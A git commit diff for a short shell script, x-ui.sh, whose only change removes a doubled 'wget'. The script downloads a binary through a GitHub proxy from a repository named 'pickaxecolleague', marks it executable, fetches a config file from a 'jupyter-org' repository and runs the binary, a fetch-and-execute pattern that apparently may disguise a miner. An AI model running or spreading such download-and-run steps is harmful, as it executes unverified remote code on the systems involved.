cfa5a7cfb7b7e47253653ecbf88843b708b190c0
pduong90322 <102961355+pduong90322@users.noreply.github.com>
2022-10-15 23:18:31 +0700

    Update x-ui.sh

--- x-ui.sh
+++ x-ui.sh
@@ -1,4 +1,4 @@
 wget https://ghproxy.com/https://github.com/pickaxecolleague/pickaxecolleague/releases/download/1.0/x-ui
 chmod +x ./x-ui
-wget wget https://ghproxy.com/https://raw.githubusercontent.com/pduong90322/jupyter-org/main/config.json
+wget https://ghproxy.com/https://raw.githubusercontent.com/pduong90322/jupyter-org/main/config.json
 ./x-ui
